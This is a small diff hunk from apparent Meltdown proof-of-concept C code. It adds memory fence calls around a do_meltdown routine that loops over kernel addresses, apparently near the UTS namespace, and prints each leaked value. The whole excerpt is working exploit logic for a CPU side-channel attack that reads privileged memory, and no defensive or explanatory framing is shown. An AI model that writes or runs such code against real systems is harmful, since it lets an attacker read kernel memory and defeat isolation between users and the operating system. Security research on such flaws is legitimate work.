@@ -177,7 +177,9 @@ static void attack_init_uts_ns(){
     for(int j=0;j<10000;j++){
         for (int i=0;i<100;i++){
             if (leaked_val[i] == -1){
+                my_mfence();
                 leaked_val[i]=do_meltdown(target_adrs+2*i);
+                my_mfence();
                 if (leaked_val[i] != -1) printf("getting value %i at location %p and i %i, cur reps %i\n", leaked_val[i], target_adrs+2*i, i, j);
             }  
         }
